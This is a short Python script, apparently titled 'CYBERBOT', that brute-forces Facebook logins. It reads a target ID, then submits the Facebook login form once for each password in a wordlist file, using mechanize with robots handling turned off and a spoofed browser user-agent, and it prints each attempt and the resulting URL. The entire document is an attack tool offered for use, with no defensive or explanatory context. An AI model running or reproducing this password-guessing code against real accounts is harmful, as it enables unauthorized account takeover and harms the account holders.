###########################################
#           MARLON   SOUSA                #
#               CYBERBOT                  #
###########################################
import mechanize

user = input('ID:')

with open('wordlist.txt', 'r') as arquivo:
    for palavra in arquivo:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.addheaders = [('User-agent', 'Firefox')]
        br.open('http://facebook.com/login.php')
        br.select_form(nr=0)
        br.form['email'] = user
        br.form['pass'] = palavra
        print(palavra)
        sub = br.submit()
        print(sub.geturl())

